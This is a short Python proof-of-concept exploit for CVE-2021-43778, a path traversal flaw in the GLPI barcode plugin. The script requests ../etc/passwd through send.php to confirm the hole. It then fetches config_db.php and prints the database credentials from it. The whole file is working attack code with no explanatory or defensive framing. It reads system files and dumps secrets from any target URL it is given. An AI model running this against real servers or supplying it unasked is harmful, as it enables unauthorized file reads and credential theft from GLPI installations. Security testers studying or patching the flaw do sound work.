#!/usr/bin/env python3 

import requests
import argparse
import sys

def isVulnerable(url):
    res = requests.get(url+"/glpi/plugins/barcode/front/send.php?file=../../../../../../../etc/passwd", timeout = 3)
    if("root:x" in res.text): 
        print("[+] Target is vulnerable")
        return True
    else: 
        print("[-] Target is not vulnerable")
        return False

if(__name__ == "__main__"):
    parser = argparse.ArgumentParser(description="CVE-2021-43778 PoC")

    parser.add_argument("url", type=str, metavar = "URL", help = "\t\t Specify url, Ex: 'http://glpi.int'")

    args = parser.parse_args()
    url = args.url

    if(isVulnerable(url)):
        configPath = url+'/glpi/plugins/barcode/front/send.php?file=../../../config/config_db.php'
        print("[+] Dumping glpi database creds from " + configPath)
        res = requests.get(configPath, timeout = 3)
        
        result = res.text
        unwantedList = ["Security attack !!!<?php", "class DB extends DBmysql {", "}"]
        for i in range(len(unwantedList)):
            result = result.replace(unwantedList[i], "")
        print(result)
    else:
        sys.exit(-1)